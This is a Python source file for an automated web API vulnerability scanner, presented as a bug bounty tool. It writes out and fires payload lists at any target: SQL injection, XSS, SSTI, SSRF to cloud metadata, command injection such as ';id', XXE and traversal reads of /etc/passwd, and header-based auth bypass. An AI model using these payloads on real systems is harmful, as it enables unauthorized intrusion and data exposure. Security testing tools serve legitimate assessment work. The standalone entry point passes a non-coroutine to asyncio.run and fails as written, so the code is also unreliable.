#!/usr/bin/env python3
# Elite API Security Hunter - Professional Bug Bounty Scanner
# WARNING: Only use on authorized targets with written permission

import asyncio
import aiohttp
import json
import time
import random
import hashlib
import base64
import os
import sys
import socket
import ssl
import struct
from typing import Dict, List, Set, Optional, Tuple, Any
from urllib.parse import urljoin, urlparse, quote, unquote, parse_qs
import string
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import warnings
warnings.filterwarnings("ignore")

# Optional imports
try:
    import jwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

class PayloadManager:
    """Advanced payload management system"""
    
    def __init__(self, base_dir="payloads"):
        self.base_dir = base_dir
        self.payloads = {}
        self.ensure_payload_structure()
        self.load_all_payloads()
    
    def ensure_payload_structure(self):
        """Create payload directory structure if not exists"""
        if not os.path.exists(self.base_dir):
            os.makedirs(self.base_dir)
            self.create_default_payloads()
    
    def create_default_payloads(self):
        """Create default payload files"""
        defaults = {
            'sql_injection.txt': [
                "'",
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'#",
                "admin' --",
                "' UNION SELECT NULL--",
                "1' AND SLEEP(5)#",
                "1';WAITFOR DELAY '0:0:5'--"
            ],
            
            'xss.txt': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "\"><script>alert(1)</script>"
            ],
            
            'ssti.txt': [
                "{{7*7}}",
                "${7*7}",
                "<%=7*7%>",
                "{{config}}",
                "{{settings.SECRET_KEY}}"
            ],
            
            'ssrf.txt': [
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost/",
                "http://127.0.0.1/",
                "file:///etc/passwd"
            ],
            
            'api_endpoints.txt': [
                "/api",
                "/api/v1",
                "/api/v2",
                "/api/v3",
                "/v1",
                "/v2",
                "/graphql",
                "/api/users",
                "/api/auth",
                "/api/login",
                "/api/health",
                "/api/status",
                "/swagger",
                "/openapi.json"
            ],
            
            'auth_bypass_headers.txt': [
                "X-Originating-IP: 127.0.0.1",
                "X-Forwarded-For: 127.0.0.1",
                "X-Real-IP: 127.0.0.1",
                "X-Original-URL: /admin"
            ],
            
            'command_injection.txt': [
                ";id",
                "|id",
                "`id`",
                "$(id)",
                ";sleep 5"
            ],
            
            'nosql_injection.txt': [
                '{"$ne": null}',
                '{"$ne": ""}',
                '{"$gt": ""}',
                '{"$exists": true}'
            ],
            
            'xxe.txt': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
            ],
            
            'lfi.txt': [
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
                "/etc/passwd"
            ]
        }
        
        for filename, payloads in defaults.items():
            filepath = os.path.join(self.base_dir, filename)
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write('\n'.join(payloads))
    
    def load_all_payloads(self):
        """Load all payload files"""
        for filename in os.listdir(self.base_dir):
            if filename.endswith('.txt'):
                filepath = os.path.join(self.base_dir, filename)
                payload_type = filename.replace('.txt', '')
                
                with open(filepath, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    self.payloads[payload_type] = payloads
                    
    def get(self, payload_type: str) -> List[str]:
        """Get payloads by type"""
        return self.payloads.get(payload_type, [])

class BugBountyScanner:
    """Elite Bug Bounty API Security Scanner - Improved Version"""
    
    def __init__(self, target: str, threads: int = 30, aggressive: int = 8):
        self.target = target if target.startswith('http') else f'https://{target}'
        self.domain = urlparse(self.target).netloc
        self.threads = threads
        self.aggressive = aggressive
        self.session = None
        self.payloads = PayloadManager()
        self.vulnerabilities = []
        self.endpoints_found = set()
        
    async def initialize(self):
        """Initialize async session"""
        timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=10)
        connector = aiohttp.TCPConnector(
            limit=self.threads,
            ssl=False,
            force_close=True
        )
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': self.get_random_ua(),
                'Accept': 'application/json, text/html, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache'
            }
        )
    
    def get_random_ua(self):
        """Random User-Agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        return random.choice(agents)
    
    def is_json_response(self, text: str) -> bool:
        """Check if response is JSON"""
        if not text or len(text) < 2:
            return False
        
        text = text.strip()
        if text[0] in ['{', '['] and text[-1] in ['}', ']']:
            try:
                json.loads(text)
                return True
            except:
                pass
        return False
    
    def is_xml_response(self, text: str) -> bool:
        """Check if response is XML"""
        if not text or len(text) < 10:
            return False
        
        text = text.strip()
        return text.startswith('<?xml') or (text.startswith('<') and text.endswith('>'))
    
    async def is_real_api_endpoint(self, url: str, response) -> Tuple[bool, str]:
        """
        Check if endpoint is real API - CRITICAL FUNCTION
        Returns: (is_api, api_type)
        """
        
        # 404 = definitely not an API
        if response.status == 404:
            return False, 'Not Found'
        
        # 1. Content-Type check - MOST IMPORTANT
        content_type = response.headers.get('Content-Type', '').lower()
        
        # Definitely API
        if 'application/json' in content_type:
            return True, 'REST/JSON'
        if 'application/xml' in content_type:
            return True, 'REST/XML'
        if 'application/graphql' in content_type:
            return True, 'GraphQL'
        if 'application/vnd.api+json' in content_type:
            return True, 'JSON:API'
        
        # 2. HTML content = NOT API
        if 'text/html' in content_type:
            return False, 'HTML Page'
        
        # 3. Authentication required endpoints
        if response.status in [401, 403]:
            # Check for API auth headers
            auth_headers = ['WWW-Authenticate', 'X-Api-Key', 'X-Auth-Token', 'Authorization']
            for header in auth_headers:
                if header in response.headers:
                    return True, 'Protected API'
        
        # 4. Response body check
        try:
            text = await response.text()
            if not text:
                return False, 'Empty Response'
            
            text_sample = text[:1000]
            
            # HTML tags = NOT API
            if '<html' in text_sample.lower() or '<!doctype' in text_sample.lower():
                return False, 'HTML Page'
            
            # JSON response
            if self.is_json_response(text_sample):
                return True, 'REST/JSON'
            
            # XML response
            if self.is_xml_response(text_sample):
                return True, 'REST/XML'
            
            # GraphQL patterns
            if '"data"' in text_sample and ('"errors"' in text_sample or '"query"' in text_sample):
                return True, 'GraphQL'
            
            # API error patterns
            api_patterns = [
                r'{"error":\s*"[^"]+"}',
                r'{"message":\s*"[^"]+"}',
                r'{"status":\s*\d+}',
                r'{"code":\s*"[^"]+"}',
                r'"api_version"',
                r'"request_id"'
            ]
            
            for pattern in api_patterns:
                if re.search(pattern, text_sample):
                    return True, 'REST API'
                    
        except:
            pass
        
        # 5. Path-based detection (last resort)
        if any(p in url.lower() for p in ['/api/', '/v1/', '/v2/', '/graphql']):
            if response.status in [200, 201, 204, 400, 401, 403]:
                # But still not if it returns HTML
                if 'text/html' not in content_type:
                    return True, 'API (path-based)'
        
        return False, 'Not API'
    
    async def verify_endpoint(self, url: str) -> Optional[str]:
        """Verify endpoint - only return real APIs"""
        methods_to_try = ['GET', 'POST', 'OPTIONS', 'HEAD']
        
        for method in methods_to_try[:3]:  # Try first 3 methods
            try:
                async with self.session.request(
                    method, 
                    url, 
                    allow_redirects=False,
                    ssl=False
                ) as response:
                    is_api, api_type = await self.is_real_api_endpoint(url, response)
                    
                    if is_api:
                        print(f"  [+] Real API found: {url} ({api_type})")
                        return url
                        
            except asyncio.TimeoutError:
                continue
            except:
                continue
        
        return None
    
    async def discover_endpoints(self) -> Set[str]:
        """Improved endpoint discovery - only find real APIs"""
        endpoints = set()
        
        print("[*] Discovering real API endpoints...")
        
        # Base check
        base_check = await self.verify_endpoint(self.target)
        if base_check:
            endpoints.add(base_check)
        
        # Common API paths
        api_paths = self.payloads.get('api_endpoints')
        
        # Additional paths for thorough checking
        additional_paths = [
            '/graphql', '/graphiql', '/api/graphql',
            '/api/v1/users', '/api/v1/auth', '/api/v1/login',
            '/api/v2/users', '/api/v2/auth', 
            '/rest/v1', '/rest/v2',
            '/api/admin', '/api/config', '/api/settings',
            '/api/health', '/api/healthcheck', '/api/ping',
            '/api-docs', '/api/swagger', '/api/docs'
        ]
        
        all_paths = api_paths + additional_paths
        
        print(f"[*] Testing {len(all_paths)} potential endpoints...")
        
        # Batch processing for speed
        batch_size = 5
        for i in range(0, len(all_paths), batch_size):
            batch = all_paths[i:i+batch_size]
            tasks = []
            
            for path in batch:
                url = urljoin(self.target, path)
                tasks.append(self.verify_endpoint(url))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if result and not isinstance(result, Exception):
                    endpoints.add(result)
            
            # Rate limiting
            await asyncio.sleep(0.3)
        
        # JavaScript extraction
        js_endpoints = await self.extract_js_endpoints()
        for url in js_endpoints:
            verified = await self.verify_endpoint(url)
            if verified:
                endpoints.add(verified)
        
        # robots.txt extraction
        robots_endpoints = await self.extract_robots_endpoints()
        for url in robots_endpoints:
            verified = await self.verify_endpoint(url)
            if verified:
                endpoints.add(verified)
        
        self.endpoints_found = endpoints
        return endpoints
    
    async def extract_js_endpoints(self) -> Set[str]:
        """Extract endpoints from JavaScript"""
        endpoints = set()
        
        try:
            async with self.session.get(self.target) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    # API patterns - only same domain
                    patterns = [
                        r'fetch\(["\'](/api/[^"\']+)["\']',
                        r'fetch\(["\'](/v\d+/[^"\']+)["\']',
                        r'axios\.[a-z]+\(["\'](/api/[^"\']+)["\']',
                        r'apiUrl["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        r'endpoint["\']?\s*[:=]\s*["\']([^"\']+)["\']'
                    ]
                    
                    for pattern in patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches[:10]:
                            if match.startswith('/'):
                                url = urljoin(self.target, match)
                                endpoints.add(url)
                            elif self.domain in match:
                                endpoints.add(match)
        except:
            pass
        
        return endpoints
    
    async def extract_robots_endpoints(self) -> Set[str]:
        """Extract from robots.txt"""
        endpoints = set()
        
        try:
            robots_url = urljoin(self.target, '/robots.txt')
            async with self.session.get(robots_url) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    lines = content.split('\n')
                    for line in lines:
                        if 'Disallow:' in line or 'Allow:' in line:
                            path = line.split(':', 1)[1].strip()
                            if path and path != '/':
                                if any(p in path for p in ['/api', '/v1', '/v2', '/rest']):
                                    url = urljoin(self.target, path)
                                    endpoints.add(url)
        except:
            pass
        
        return endpoints

    async def test_sql_injection(self, endpoint: str) -> List[Dict]:
        """Test SQL Injection - only real SQL errors"""
        findings = []
        payloads = self.payloads.get('sql_injection')
        
        # Test parameters
        params = ['id', 'user', 'search', 'q', 'filter', 'category']
        
        # Real SQL error patterns
        sql_errors = [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_',
            r'PostgreSQL.*ERROR',
            r'OLE DB.*SQL Server',
            r'ORA-[0-9]{5}',
            r'SQLite error',
            r'SQLException',
            r'valid MySQL result'
        ]
        
        for param in params[:3]:
            # Baseline request first
            baseline_url = f"{endpoint}?{param}=1"
            
            try:
                async with self.session.get(baseline_url) as baseline_resp:
                    if baseline_resp.status == 404:
                        continue
                    
                    baseline_content = await baseline_resp.text()
                    
                    for payload in payloads[:5]:
                        test_url = f"{endpoint}?{param}={quote(payload)}"
                        
                        # Time-based detection
                        if 'SLEEP' in payload.upper():
                            start = time.time()
                            async with self.session.get(test_url, timeout=8) as response:
                                elapsed = time.time() - start
                                
                                if elapsed > 4.5:
                                    findings.append({
                                        'type': 'SQL_INJECTION',
                                        'subtype': 'Time-based Blind',
                                        'endpoint': endpoint,
                                        'parameter': param,
                                        'payload': payload,
                                        'severity': 'CRITICAL',
                                        'confidence': 'HIGH',
                                        'evidence': f'Response delayed {elapsed:.1f}s'
                                    })
                                    return findings
                        
                        # Error-based detection
                        else:
                            async with self.session.get(test_url) as response:
                                if response.status in [200, 500]:
                                    content = await response.text()
                                    
                                    # Check for SQL errors
                                    for error_pattern in sql_errors:
                                        if re.search(error_pattern, content, re.IGNORECASE):
                                            # Make sure error wasn't in baseline
                                            if not re.search(error_pattern, baseline_content, re.IGNORECASE):
                                                findings.append({
                                                    'type': 'SQL_INJECTION',
                                                    'subtype': 'Error-based',
                                                    'endpoint': endpoint,
                                                    'parameter': param,
                                                    'payload': payload,
                                                    'severity': 'CRITICAL',
                                                    'confidence': 'HIGH',
                                                    'evidence': 'SQL error detected'
                                                })
                                                return findings
                        
                        await asyncio.sleep(0.2)  # Rate limiting
                        
            except:
                continue
        
        return findings
    
    async def test_xss(self, endpoint: str) -> List[Dict]:
        """Test Cross-Site Scripting"""
        findings = []
        payloads = self.payloads.get('xss')
        
        for payload in payloads[:5]:
            params = ['q', 'search', 'query', 'keyword', 'name']
            
            for param in params[:3]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    async with self.session.get(test_url) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check if payload reflected without encoding
                            if payload in content:
                                findings.append({
                                    'type': 'XSS',
                                    'subtype': 'Reflected',
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'HIGH',
                                    'confidence': 'HIGH',
                                    'evidence': 'Payload reflected without encoding'
                                })
                                return findings
                except:
                    pass
        
        return findings
    
    async def test_ssti(self, endpoint: str) -> List[Dict]:
        """Test Server-Side Template Injection"""
        findings = []
        
        # SSTI test with verification
        tests = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("{{7*'7'}}", "7777777")
        ]
        
        params = ['template', 'name', 'msg', 'content']
        
        for payload, expected in tests:
            for param in params[:2]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    async with self.session.get(test_url) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Verify execution
                            if expected in content and payload not in content:
                                findings.append({
                                    'type': 'SSTI',
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'CRITICAL',
                                    'confidence': 'HIGH',
                                    'evidence': f'Template executed: {expected} in response'
                                })
                                return findings
                except:
                    pass
        
        return findings
    
    async def test_ssrf(self, endpoint: str) -> List[Dict]:
        """Test Server-Side Request Forgery"""
        findings = []
        payloads = self.payloads.get('ssrf')
        
        params = ['url', 'uri', 'path', 'dest', 'redirect']
        
        for param in params[:3]:
            for payload in payloads[:3]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    async with self.session.get(test_url, timeout=8) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check for internal data
                            indicators = ['root:', 'daemon:', 'localhost', 'metadata']
                            
                            for indicator in indicators:
                                if indicator in content:
                                    findings.append({
                                        'type': 'SSRF',
                                        'endpoint': endpoint,
                                        'parameter': param,
                                        'payload': payload,
                                        'severity': 'CRITICAL',
                                        'confidence': 'HIGH',
                                        'evidence': f'Internal data leaked: {indicator}'
                                    })
                                    return findings
                except:
                    pass
        
        return findings
    
    async def test_auth_bypass(self, endpoint: str) -> List[Dict]:
        """Test Authentication Bypass"""
        findings = []
        headers = self.payloads.get('auth_bypass_headers')
        
        for header_line in headers[:10]:
            if ':' in header_line:
                header_name, header_value = header_line.split(':', 1)
                test_headers = {header_name.strip(): header_value.strip()}
                
                try:
                    # First get normal response
                    async with self.session.get(endpoint) as normal_resp:
                        normal_status = normal_resp.status
                        
                        # If normally forbidden/unauthorized
                        if normal_status in [401, 403]:
                            # Try with bypass header
                            async with self.session.get(endpoint, headers=test_headers) as response:
                                if response.status == 200:
                                    findings.append({
                                        'type': 'AUTH_BYPASS',
                                        'endpoint': endpoint,
                                        'technique': header_line,
                                        'severity': 'CRITICAL',
                                        'confidence': 'HIGH'
                                    })
                                    return findings
                except:
                    pass
        
        return findings
    
    async def test_command_injection(self, endpoint: str) -> List[Dict]:
        """Test Command Injection"""
        findings = []
        payloads = self.payloads.get('command_injection')
        
        params = ['cmd', 'exec', 'command', 'ping', 'host']
        
        for param in params[:3]:
            for payload in payloads[:3]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    # Time-based detection
                    if 'sleep' in payload.lower():
                        start = time.time()
                        async with self.session.get(test_url) as response:
                            elapsed = time.time() - start
                            
                            if elapsed > 4.5:
                                findings.append({
                                    'type': 'COMMAND_INJECTION',
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'CRITICAL',
                                    'confidence': 'HIGH',
                                    'evidence': f'Command executed (delay: {elapsed:.1f}s)'
                                })
                                return findings
                except:
                    pass
        
        return findings
   
    async def test_nosql_injection(self, endpoint: str) -> List[Dict]:
        """Test NoSQL Injection"""
        findings = []
        payloads = self.payloads.get('nosql_injection')
        
        for payload in payloads[:3]:
            try:
                headers = {'Content-Type': 'application/json'}
                async with self.session.post(endpoint, data=payload, headers=headers) as response:
                    if response.status in [200, 201]:
                        content = await response.text()
                        
                        if len(content) > 100 and 'error' not in content.lower():
                            findings.append({
                                'type': 'NOSQL_INJECTION',
                                'endpoint': endpoint,
                                'payload': payload,
                                'severity': 'HIGH',
                                'confidence': 'MEDIUM'
                            })
                            return findings
            except:
                pass
        
        return findings
    
    async def test_xxe(self, endpoint: str) -> List[Dict]:
        """Test XML External Entity"""
        findings = []
        payloads = self.payloads.get('xxe')
        
        for payload in payloads[:2]:
            try:
                headers = {'Content-Type': 'application/xml'}
                async with self.session.post(endpoint, data=payload, headers=headers) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check for file content
                        if any(ind in content for ind in ['root:', 'daemon:', 'Windows']):
                            findings.append({
                                'type': 'XXE',
                                'endpoint': endpoint,
                                'severity': 'CRITICAL',
                                'confidence': 'HIGH',
                                'evidence': 'File contents disclosed'
                            })
                            return findings
            except:
                pass
        
        return findings
    
    async def test_lfi(self, endpoint: str) -> List[Dict]:
        """Test Local File Inclusion"""
        findings = []
        payloads = self.payloads.get('lfi')
        
        params = ['file', 'path', 'page', 'include', 'template']
        
        for param in params[:3]:
            for payload in payloads[:3]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    async with self.session.get(test_url) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check for file content
                            if any(ind in content for ind in ['root:x:', 'daemon:', '[fonts]']):
                                findings.append({
                                    'type': 'LFI',
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'HIGH',
                                    'confidence': 'HIGH',
                                    'evidence': 'Local file contents exposed'
                                })
                                return findings
                except:
                    pass
        
        return findings
    
    async def test_endpoint(self, endpoint: str) -> List[Dict]:
        """Run all tests on endpoint"""
        all_findings = []
        
        # Rate limiting
        await asyncio.sleep(0.1)
        
        # Run all tests
        tests = [
            self.test_sql_injection(endpoint),
            self.test_xss(endpoint),
            self.test_ssti(endpoint),
            self.test_ssrf(endpoint),
            self.test_auth_bypass(endpoint),
            self.test_command_injection(endpoint),
            self.test_nosql_injection(endpoint),
            self.test_xxe(endpoint),
            self.test_lfi(endpoint)
        ]
        
        results = await asyncio.gather(*tests, return_exceptions=True)
        
        for result in results:
            if result and not isinstance(result, Exception):
                all_findings.extend(result)
        
        return all_findings
    
    async def scan(self) -> Dict:
        """Main scanning function"""
        await self.initialize()
        
        print("\n" + "="*60)
        print(" BUG BOUNTY API SECURITY SCANNER")
        print("="*60)
        print(f" Target: {self.target}")
        print(f" Aggression Level: {self.aggressive}/10")
        print("="*60 + "\n")
        
        # Phase 1: Discovery
        print("[PHASE 1] Endpoint Discovery")
        endpoints = await self.discover_endpoints()
        
        if not endpoints:
            print("  [!] No real API endpoints found, using base URL")
            endpoints = {self.target}
        else:
            print(f"  [+] Total real API endpoints: {len(endpoints)}")
        
        # Phase 2: Security Testing
        print("\n[PHASE 2] Security Testing")
        
        all_findings = []
        tested = 0
        
        for endpoint in list(endpoints):
            tested += 1
            print(f"  [{tested}/{len(endpoints)}] Testing: {endpoint}")
            
            findings = await self.test_endpoint(endpoint)
            all_findings.extend(findings)
            
            # Early exit on critical findings
            critical = [f for f in all_findings if f.get('severity') == 'CRITICAL']
            if len(critical) >= 10:
                print("\n  [!] 10+ CRITICAL vulnerabilities found - stopping scan")
                break
        
        await self.session.close()
        
        # Generate report
        self.generate_report(all_findings, len(endpoints), tested)
        
        return {
            'target': self.target,
            'endpoints_found': len(endpoints),
            'endpoints_tested': tested,
            'vulnerabilities': all_findings,
            'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    
    def generate_report(self, findings: List[Dict], total_endpoints: int, tested: int):
        """Generate detailed final report"""
        
        # Categorize findings
        critical = [f for f in findings if f.get('severity') == 'CRITICAL']
        high = [f for f in findings if f.get('severity') == 'HIGH']
        medium = [f for f in findings if f.get('severity') == 'MEDIUM']
        low = [f for f in findings if f.get('severity') == 'LOW']
        
        print("\n" + "="*60)
        print(" SCAN RESULTS")
        print("="*60)
        print(f" Real API Endpoints Found: {total_endpoints}")
        print(f" Endpoints Tested: {tested}")
        print(f" Total Vulnerabilities: {len(findings)}")
        print("="*60)
        
        if critical:
            print(f"\n[CRITICAL] {len(critical)} vulnerabilities:")
            for vuln in critical[:10]:
                print(f"  • {vuln['type']}: {vuln['endpoint'][:60]}")
                if 'evidence' in vuln:
                    print(f"    Evidence: {vuln['evidence']}")
        
        if high:
            print(f"\n[HIGH] {len(high)} vulnerabilities:")
            for vuln in high[:5]:
                print(f"  • {vuln['type']}: {vuln['endpoint'][:60]}")
        
        if medium:
            print(f"\n[MEDIUM] {len(medium)} vulnerabilities:")
            for vuln in medium[:5]:
                print(f"  • {vuln['type']}: {vuln['endpoint'][:60]}")
        
        if low:
            print(f"\n[LOW] {len(low)} vulnerabilities")
        
        print("\n" + "="*60)

# Main execution function - IMPORTANT: Same name as original module
def run_scanner(target: str, threads: int = 30, aggressive: int = 8):
    """Run the bug bounty scanner - module interface"""
    scanner = BugBountyScanner(target, threads=threads, aggressive=aggressive)
    return scanner  # Return the scanner object, not a coroutine

if __name__ == "__main__":
    # Standalone execution
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python elite_api_hunter.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    asyncio.run(run_scanner(target))
